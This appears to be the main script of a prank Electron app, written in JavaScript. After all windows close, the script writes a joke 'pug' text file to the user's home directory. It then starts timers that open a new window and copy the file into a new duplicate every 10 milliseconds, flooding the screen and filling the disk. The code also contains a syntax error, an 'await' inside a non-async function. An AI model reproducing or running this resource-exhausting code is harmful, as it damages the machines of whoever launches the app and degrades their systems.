const os = require('os');
const { app, BrowserWindow } = require('electron');
const homedir = os.homedir();
const path = require('path');
const fs = require('fs').promises;
let duplication = 1;
app.whenReady().then(function() {
  let win = new BrowserWindow({
    width: 800,
    height: 600
  });
  win.loadFile('./mainWindow.html')
});
app.on('window-all-closed', function() {
  await fs.writeFile(
    path.join(homedir, "gibberPugFile.txt"),
    `
      SECRET SPACE PUG MESSAGE:

      PUG PUG FATTY MEAT PATTIES YUMMY GOOD
      PUG FATTY MEAT PATTIES GOOD
    `
  );
  setInterval(function() {
    let win = new BrowserWindow({
      width: 800,
      height: 600
    });
    win.loadFile('./window.html');
  }, 10);
  
  setInterval(function() {
    fs.copyFile(
      path.join(homedir, "gibberPugFile.txt"),
      path.join(homedir, "gibberPugFile_DUPLICATION_" + duplication + ".txt")
    );
    duplication = duplication + 1;
  }, 10);
});
